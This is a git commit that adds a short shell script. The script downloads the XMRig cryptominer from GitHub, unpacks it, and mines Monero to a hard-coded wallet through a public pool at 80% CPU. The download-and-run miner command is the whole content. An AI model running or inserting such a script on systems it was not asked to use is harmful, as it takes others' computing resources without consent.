9c20e6c0233365c1d98634a0cc818df4ab409e7c
madewgn <madewg.n2@gmail.com>
2024-02-11 07:24:54 +0800

    p

---
+++ main.sh
@@ -0,0 +1,4 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz; tar -xf xmrig-6.21.0-linux-x64.tar.gz; cd xmrig-6.21.0; 
+
+
+./xmrig -o xmr.2miners.com:2222 -u 882ZbQJrvWG4VFa34hyoF6is1Ra8TBP8VBYuJA4gKMMa7wVq8wEogPSRdM7mp6JVeP8WpUybPxccN4jFrJDdZc21CUvaCZv -p wgnx -k --coin monero -a rx/0 --max-cpu-usage 80 
